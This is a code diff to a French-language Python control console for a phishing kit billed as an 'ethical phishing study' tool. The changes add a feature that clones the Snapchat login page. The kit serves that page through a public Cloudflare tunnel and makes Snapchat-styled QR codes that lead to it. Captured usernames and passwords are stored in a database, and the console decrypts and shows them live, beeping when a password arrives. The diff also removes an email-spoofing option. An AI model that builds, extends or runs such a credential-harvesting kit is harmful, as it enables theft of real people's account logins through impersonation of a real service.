@@ -8,6 +8,7 @@ import os, sys, json, sqlite3, time, threading, socket, webbrowser, subprocess, 
 from datetime import datetime
 from io import StringIO
 import csv
+from app.crypto import decrypt_password
 
 BASE = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE, "captured_credentials.db")
@@ -57,22 +58,38 @@ console = Console() if RICH_OK else None
 
 # ── Logo ASCII ──
 LOGO_RAW = """\
-███████╗███╗   ███╗     ███████╗███╗   ██╗ ██████╗
-██╔════╝████╗ ████║     ██╔════╝████╗  ██║██╔════╝
-███████╗██╔████╔██║     ███████╗██╔██╗ ██║██║  ███╗
-╚════██║██║╚██╔╝██║     ╚════██║██║╚██╗██║██║   ██║
-███████║██║ ╚═╝ ██║     ███████║██║ ╚████║╚██████╔╝
-╚══════╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝"""
+╔═══════════════════════════════════════════╗
+║                                           ║
+║               █████  █   █                ║
+║               █      ██ ██                ║
+║               █████  █ █ █                ║
+║               █      █   █                ║
+║               █      █   █                ║
+║                                           ║
+║            █████  █   █  █████             ║
+║            █      ██  █  █                 ║
+║            █████  █ █ █  █ ███             ║
+║                █  █  ██  █   █            ║
+║            █████  █   █  █████             ║
+║                                           ║
+╚═══════════════════════════════════════════╝"""
 
-TAGLINE = "Purple Team  •  Research Tool  •  Ethical Phishing Study"
+TAGLINE = "FM_SNG  •  Purple Team  •  Research Tool  •  Ethical Phishing Study"
 
 # ── Globals ──
 flask_thread = None
+FLASK_USE_SSL = True
 cf_thread = None
 cf_url = None
 cf_proc = None
 WATCH_ACTIVE = False
 CONFIG_CACHE = {}
+
+try:
+    import winsound
+    HAS_WINSOUND = True
+except:
+    HAS_WINSOUND = False
 
 # ══════════════════════════════════════════════════════════════
 #  RICH SHORTHANDS
@@ -240,9 +257,10 @@ def is_server_running():
         s.close()
 
 def server_url():
+    global FLASK_USE_SSL
     try:
         from main import CONFIG as _cfg
-        proto = "https" if _cfg.get("USE_HTTPS") else "http"
+        proto = "https" if FLASK_USE_SSL else "http"
         port = _cfg.get("SERVER_PORT", 8080)
     except:
         proto = "http"
@@ -250,12 +268,13 @@ def server_url():
     return f"{proto}://localhost:{port}"
 
 def start_flask():
+    global FLASK_USE_SSL
     os.environ["PYTHONIOENCODING"] = "utf-8"
     import logging
     logging.getLogger("werkzeug").setLevel(logging.ERROR)
     from main import app, init_database, CONFIG
     init_database()
-    ssl_ctx = 'adhoc' if CONFIG.get("USE_HTTPS") else None
+    ssl_ctx = None if not FLASK_USE_SSL else ('adhoc' if CONFIG.get("USE_HTTPS") else None)
     port = CONFIG.get("SERVER_PORT", 8080)
     app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False, ssl_context=ssl_ctx)
 
@@ -351,9 +370,8 @@ def _run_tunnel():
     try:
         from main import CONFIG as _cfg
         port = _cfg.get("SERVER_PORT", 8080)
-        proto = "https" if _cfg.get("USE_HTTPS") else "http"
         proc = subprocess.Popen(
-            [CF_PATH, "tunnel", "--url", f"{proto}://127.0.0.1:{port}"],
+            [CF_PATH, "tunnel", "--url", f"http://127.0.0.1:{port}"],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
@@ -440,9 +458,14 @@ def show_menu_fallback():
 # ══════════════════════════════════════════════════════════════
 
 def action_1_start():
+    global FLASK_USE_SSL
     stop_tunnel()
     show_logo()
+    FLASK_USE_SSL = True
     info("Démarrage du serveur...")
+    if not is_server_running():
+        stop_server()
+        time.sleep(0.5)
     if start_server():
         okay(f"Serveur actif : [link={server_url()}]{server_url()}[/]")
     else:
@@ -450,6 +473,7 @@ def action_1_start():
     pause()
 
 def action_2_tunnel():
+    global FLASK_USE_SSL
     show_logo()
     if not os.path.exists(CF_PATH):
         warn("Cloudflared non trouvé. Téléchargement...")
@@ -457,8 +481,13 @@ def action_2_tunnel():
             pause()
             return
     stop_tunnel()
+    if is_server_running():
+        stop_server()
+        time.sleep(1)
+    FLASK_USE_SSL = False
     if not start_server():
         panic("Le serveur n'a pas démarré")
+        FLASK_USE_SSL = True
         pause()
         return
     info("Démarrage du tunnel Cloudflare...")
@@ -649,9 +678,12 @@ def watch_live():
                     has_pw = bool(pw and pw != "-")
                     label = "[bold green]CAPTURE[/]" if has_pw else "[yellow]LOGIN[/]"
                     style = "green" if has_pw else "yellow"
-                    console.print(f"  [dim]{ts}[/] {label} [bold #{r[0]}][/{bold}] [{step}] [white]{user}[/] / [bold {style}]{pw}[/]")
+                    console.print(f"  [dim]{ts}[/] {label} [bold]#{r[0]}[/bold] [{step}] [white]{user}[/] / [bold {style}]{pw}[/]")
                     if has_pw:
-                        console.print("  \a", end='')
+                        if HAS_WINSOUND:
+                            winsound.Beep(880, 200)
+                        else:
+                            console.print("  \a", end='')
                     last_id = r[0]
                 for v in votes:
                     ts = v[3][11:19] if v[3] else "--:--:--"
@@ -667,7 +699,10 @@ def watch_live():
                     label = f"{G}CAPTURE{X}" if pw and pw != "-" else f"{Y}LOGIN{X}"
                     print(f"  {D}{ts}{X} {label} #{r[0]} [{step:<8}] {user} / {pw}")
                     if pw and pw != "-":
-                        print("  \a", end='', flush=True)
+                        if HAS_WINSOUND:
+                            winsound.Beep(880, 200)
+                        else:
+                            print("  \a", end='', flush=True)
                     last_id = r[0]
                 for v in votes:
                     ts = v[3][11:19] if v[3] else "--:--:--"
@@ -931,8 +966,10 @@ def td_creds(show_pw):
         tbl.add_column("Password")
         tbl.add_column("Timestamp", style="dim")
         for r in rows:
-            has = bool(r[3])
-            pw = f"[green]{r[3]}[/]" if show_pw and has else ("[green]***[/]" if has else "[dim]-[/]")
+            raw = r[3] or ""
+            has = bool(raw)
+            plain = decrypt_password(raw) if has else ""
+            pw = f"[green]{plain}[/]" if show_pw and has else ("[green]***[/]" if has else "[dim]-[/]")
             step = r[5] or "?"
             tbl.add_row(str(r[0]), f"[{'green' if has else 'dim'}]{step}[/]",
                        str(r[1] or '-')[:22], str(r[2] or '-')[:22], pw, str(r[4])[:19] if r[4] else "")
@@ -940,8 +977,10 @@ def td_creds(show_pw):
     else:
         print(f"\n  {C}CREDENTIALS ({len(rows)} enregistrement(s)){X}\n")
         for r in rows:
-            has = bool(r[3])
-            pw = f"{G}{r[3]}{X}" if show_pw and has else (f"{G}***{X}" if has else f"{D}-{X}")
+            raw = r[3] or ""
+            has = bool(raw)
+            plain = decrypt_password(raw) if has else ""
+            pw = f"{G}{plain}{X}" if show_pw and has else (f"{G}***{X}" if has else f"{D}-{X}")
             step = r[5] or "?"
             color = G if has else D
             pid_short = str(r[1] or '-')[:22]
@@ -1103,6 +1142,7 @@ def td_votes():
 # ══════════════════════════════════════════════════════════════
 
 def action_campaign():
+    global FLASK_USE_SSL
     scenario_id = "classement"
     server_running = False
     tunnel_url = None
@@ -1144,7 +1184,7 @@ def action_campaign():
                 grid.add_row("", f"  [dim]URL : {tunnel_url}[/]")
             grid.add_row("", "")
             grid.add_row("[bold]ÉTAPE 3 — Générer les outils[/]")
-            grid.add_row("", "  [dim]QR code, Email spoof, Liens[/]")
+            grid.add_row("", "  [dim]QR code, Liens, Refresh page Snapchat[/]")
             grid.add_row("", "")
             grid.add_row("[bold]ÉTAPE 4 — Surveillance[/]")
             grid.add_row("", "  [dim]Watch Live, Dashboard[/]")
@@ -1156,10 +1196,10 @@ def action_campaign():
             if server_running:
                 grid.add_row("[green][3][/]", "+ Tunnel Cloudflare")
                 grid.add_row("[green][4][/]", "Générer un QR code")
-                grid.add_row("[green][5][/]", "Envoyer un email piégé")
-                grid.add_row("[green][6][/]", "Watch Live")
-                grid.add_row("[green][7][/]", "Dashboard")
-                grid.add_row("[green][8][/]", "Ouvrir dans le navigateur")
+                grid.add_row("[green][R][/]", "Refresh page Snapchat (clone)")
+                grid.add_row("[green][5][/]", "Watch Live")
+                grid.add_row("[green][6][/]", "Dashboard")
+                grid.add_row("[green][7][/]", "Ouvrir dans le navigateur")
             grid.add_row("[green][10][/]", "Gestion automatisée des campagnes")
             grid.add_row("[red][9][/]", "Arrêter le serveur")
             grid.add_row("[dim][0][/]", "[dim]Retour au menu principal[/]")
@@ -1181,7 +1221,7 @@ def action_campaign():
                 print(f"    {D}URL : {tunnel_url}{X}")
             print()
             print(f"  {C}ÉTAPE 3 — Générer les outils{X}")
-            print(f"    {D}QR code, Email spoof, Liens{X}")
+            print(f"    {D}QR code, Liens, Refresh page Snapchat{X}")
             print()
             print(f"  {C}ÉTAPE 4 — Surveillance{X}")
             print(f"    {D}Watch Live, Dashboard{X}")
@@ -1192,10 +1232,10 @@ def action_campaign():
             if server_running:
                 print(f"    {G}[3]{X}  + Tunnel Cloudflare")
                 print(f"    {G}[4]{X}  Générer un QR code")
-                print(f"    {G}[5]{X}  Envoyer un email piégé")
-                print(f"    {G}[6]{X}  Watch Live")
-                print(f"    {G}[7]{X}  Dashboard")
-                print(f"    {G}[8]{X}  Ouvrir dans le navigateur")
+                print(f"    {G}[R]{X}  Refresh page Snapchat (clone)")
+                print(f"    {G}[5]{X}  Watch Live")
+                print(f"    {G}[6]{X}  Dashboard")
+                print(f"    {G}[7]{X}  Ouvrir dans le navigateur")
             print(f"    {G}[10]{X}  Gestion automatisée des campagnes")
             print(f"    {R}[9]{X}  Arrêter le serveur")
             print(f"    {D}[0]{X}  Retour au menu principal")
@@ -1242,15 +1282,25 @@ def action_campaign():
 
         elif c == "2":
             stop_tunnel()
-            if start_server():
-                server_running = True
-                okay(f"Serveur démarré sur http://localhost:8080")
-                info(f"URL scénario : http://localhost:8080/scenario/{scenario_id}")
-            else:
+            if is_server_running():
+                stop_server()
+                time.sleep(0.5)
+            FLASK_USE_SSL = True
+            if not start_server():
                 panic("Échec du démarrage")
+                pause()
+                continue
+            server_running = True
+            base = server_url()
+            okay(f"Serveur démarré sur {base}")
+            info(f"URL scénario : {base}/scenario/{scenario_id}")
             pause()
 
         elif c == "3" and server_running:
+            stop_server()
+            time.sleep(1)
+            FLASK_USE_SSL = False
+            start_server()
             tunnel_url = start_tunnel()
             if tunnel_url:
                 okay(f"Tunnel actif : [link={tunnel_url}]{tunnel_url}[/]")
@@ -1260,20 +1310,44 @@ def action_campaign():
             pause()
 
         elif c == "4" and server_running:
-            base_url = tunnel_url or f"http://localhost:8080"
+            base_url = tunnel_url or server_url()
             campagne_url = f"{base_url}/scenario/{scenario_id}"
-            with _spinner("Génération du QR code..."):
+            with _spinner("Generation du QR code..."):
                 try:
-                    exec(open(os.path.join(BASE, "tools/qr_generator.py")).read().replace("interactive_menu()", ""))
-                    from tools import qr_generator as qr
-                    filepath = qr.make_styled_qr(campagne_url, "snapchat")
-                    okay(f"QR code généré : {filepath}")
+                    from tools.qr_generator import make_styled_qr
+                    filepath = make_styled_qr(campagne_url, "snapchat")
+                    okay(f"QR code genere : {filepath}")
                     info(f"Contient : {campagne_url}")
                     if os.name == "nt":
                         os.startfile(os.path.dirname(filepath))
+                except ImportError:
+                    panic("qrcode[pil] non installe. Installation...")
+                    import subprocess, sys
+                    subprocess.check_call([sys.executable, "-m", "pip", "install", "qrcode[pil]"])
+                    from tools.qr_generator import make_styled_qr
+                    filepath = make_styled_qr(campagne_url, "snapchat")
+                    okay(f"QR code genere : {filepath}")
                 except Exception as e:
                     panic(f"Erreur : {e}")
-                    warn("pip install qrcode[pil]")
+            pause()
+
+        elif c.lower() == "r":
+            with _spinner("Telechargement de la page Snapchat..."):
+                try:
+                    sys.path.insert(0, os.path.join(BASE, "tools"))
+                    from refresh_snapchat import main as refresh_page
+                    refresh_page()
+                    okay("Page Snapchat mise a jour !")
+                except ImportError:
+                    panic("Playwright non installe. Installation...")
+                    import subprocess, sys
+                    subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])
+                    subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
+                    from refresh_snapchat import main as refresh_page
+                    refresh_page()
+                    okay("Page Snapchat mise a jour !")
+                except Exception as e:
+                    panic(f"Erreur : {e}")
             pause()
 
         elif c == "10" and server_running:
@@ -1288,23 +1362,11 @@ def action_campaign():
             pause()
 
         elif c == "5" and server_running:
-            base_url = tunnel_url or f"http://localhost:8080"
-            campagne_url = f"{base_url}/scenario/{scenario_id}"
-            with _spinner("Préparation de l'envoi email..."):
-                try:
-                    sys.path.insert(0, os.path.join(BASE, "tools"))
-                    import email_spoofer
-                    email_spoofer.interactive_menu()
-                except Exception as e:
-                    panic(f"Erreur : {e}")
-            pause()
-
-        elif c == "6" and server_running:
             watch_live()
-        elif c == "7" and server_running:
+        elif c == "6" and server_running:
             terminal_dashboard()
-        elif c == "8" and server_running:
-            base_url = tunnel_url or f"http://localhost:8080"
+        elif c == "7" and server_running:
+            base_url = tunnel_url or server_url()
             url = f"{base_url}/scenario/{scenario_id}"
             webbrowser.open(url)
             okay(f"Ouverture : {url}")
